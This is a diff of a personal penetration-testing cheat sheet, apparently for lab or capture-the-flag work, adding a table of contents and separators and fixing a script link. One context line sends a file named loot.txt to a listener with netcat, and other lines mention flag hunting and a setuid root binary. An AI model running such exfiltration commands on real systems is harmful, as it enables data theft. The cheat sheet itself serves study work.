@@ -3,6 +3,13 @@
 
 handy commands organised for quick reference 
 
+1. [File Transfer](#File-Transfer)
+	- [Kali -> Windows](#Kali -> Windows )
+	- [Windows -> Kali ](#Windows -> Kali  )
+	- [Linux -> Linux](#Linux -> Linux)
+2. [Windows cmd reference](#Windows cmd reference)
+3. [Linux cmd reference](#Linux cmd refernece)
+
 **Example Network**  
 
 | Machine         | IP               |
@@ -293,6 +300,11 @@ Kali:
 nc 192.168.111.137 4444 < loot.txt
 ```
 
+
+
+---
+
+
 ## Windows cmd reference
 
 ### Find flag or Specific File  
@@ -337,6 +349,11 @@ copy "C:\Users\username\My Documents\file.exe" "C:\Users\Public\file.exe"
 ```powershell
 PS C:\users\public> New-Item -ItemType Directory -Path C:\Users\public\logs
 ```
+
+
+
+---
+
 
 # Linux cmd reference
 
@@ -443,7 +460,7 @@ Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
 
 ### chmod linux permissions 
 
-run  [`chmod_calc.sh`](./scripts/chmod_calc.sh)  to lookup chmod permissions fast in terminal
+run  [`chmod_calc.sh`](../../03-tools/scripts/chmod_calc.sh)  to lookup chmod permissions fast in terminal
 
 make it executable as always
 ```bash
